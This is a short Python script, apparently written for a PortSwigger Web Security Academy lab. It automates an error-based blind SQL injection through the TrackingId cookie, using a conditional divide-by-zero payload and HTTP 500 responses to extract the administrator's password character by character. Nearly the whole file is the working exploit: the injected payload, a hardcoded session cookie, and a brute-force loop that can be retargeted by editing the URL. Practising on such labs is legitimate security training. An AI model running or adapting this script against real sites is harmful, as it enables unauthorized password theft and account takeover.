#!/usr/bin/python3 

import sys, signal, requests, string, time

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

url = "https://0a6e00ca04714a2c8027940900e600af.web-security-academy.net/"
characters = string.digits + string.ascii_lowercase

signal.signal(signal.SIGINT, def_handler)

# def getDB():

def getPassword(): 

    print("\n2. Blind SQli: Error-Based:")
    print("\n[*] Retrieving Administrator Password: ", end='')

    time.sleep(0.30)

    password = ""

    for position in range (1, 21):
        found_character = False

        for character in characters: 
            cookies = {
                    "TrackingId": "c0pkuioBtlAyGS1M'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                    "session": "HKDDNhXxLYCGhveqqBg2xY4Vzak3ZDAk"

            }

            r = requests.get(url, cookies=cookies)
            
            #print(r.status_code)

            if r.status_code == 500:
                password += character
                print(character, end='')
                sys.stdout.flush()
                found_character = True
                break

        if not found_character:
             break


    print("\n[+] Password succesfully obtained!!\n")
    time.sleep(0.5)
    sys.exit(0)


if __name__ == '__main__':
    getPassword()

